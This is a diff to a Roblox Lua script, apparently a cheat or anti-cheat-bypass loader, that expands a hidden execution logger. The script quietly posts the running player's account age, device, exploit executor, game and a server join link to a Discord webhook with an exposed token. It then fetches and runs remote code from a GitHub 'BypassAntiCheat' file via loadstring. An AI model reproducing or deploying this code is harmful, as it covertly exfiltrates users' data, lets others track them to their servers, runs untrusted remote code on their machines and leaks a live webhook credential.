@@ -1,17 +1,59 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1366093954726101012/7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"
 
-local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
-local deviceType = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled) and "Mobile" or "Computer"
-local accountAge = LocalPlayer.AccountAge or "Unknown Age"
+-- Detect Device
+local deviceType = "Unknown"
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
+    deviceType = "Mobile"
+elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+    deviceType = "PC"
+end
 
+-- Detect Executor
+local executor = "Unknown"
+if identifyexecutor then
+    executor = identifyexecutor()
+elseif syn then
+    executor = "Synapse X"
+elseif is_sirhurt_closure then
+    executor = "Sirhurt"
+elseif pebc_execute then
+    executor = "Script-Ware"
+elseif KRNL_LOADED then
+    executor = "KRNL"
+elseif fluxus then
+    executor = "Fluxus"
+elseif isexecutorclosure then
+    executor = "Delta"
+elseif is_trigon_closure then
+    executor = "Trigon"
+elseif getexecutorname then
+    executor = getexecutorname()
+elseif (readfile and writefile and getrenv) then
+    executor = "Electron"
+elseif (hookfunction and not syn) then
+    executor = "Hydrogen or OxygenU or other mobile executor"
+elseif (ARCEUS_LOADED) then
+    executor = "Arceus X"
+end
+
+-- Get Game Name
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+local gameName = success and gameInfo.Name or "Unknown Game"
+
+-- Prepare Data
 local data = {
-    ["username"] = "Script Logger",
+    ["username"] = "Execution Logger",
     ["embeds"] = {{
-        ["title"] = "Someone Executed Your Script!",
+        ["title"] = "Script Executed!",
         ["color"] = tonumber(0x00ff00),
         ["fields"] = {
             {
@@ -25,14 +67,9 @@ local data = {
                 ["inline"] = true
             },
             {
-                ["name"] = "Game",
-                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Server JobId",
-                ["value"] = string.format("[%s](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, game.PlaceId, "Join Game", game.JobId),
-                ["inline"] = false
+                ["name"] = "Device",
+                ["value"] = deviceType,
+                ["inline"] = true
             },
             {
                 ["name"] = "Executor",
@@ -40,24 +77,30 @@ local data = {
                 ["inline"] = true
             },
             {
-                ["name"] = "Device Type",
-                ["value"] = deviceType,
+                ["name"] = "Account Age",
+                ["value"] = tostring(LocalPlayer.AccountAge).." days",
                 ["inline"] = true
             },
             {
-                ["name"] = "Account Age",
-                ["value"] = tostring(accountAge).." days",
-                ["inline"] = true
+                ["name"] = "Game",
+                ["value"] = gameName,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Server JobId",
+                ["value"] = string.format("[Join Server](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, "Join", game.JobId),
+                ["inline"] = false
             },
             {
                 ["name"] = "Execution Time",
                 ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
-                ["inline"] = false
+                ["inline"] = true
             }
-        }
-    }}
+        }}
+    }
 }
 
+-- Send to Webhook
 HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/refs/heads/main/main.lua"))()
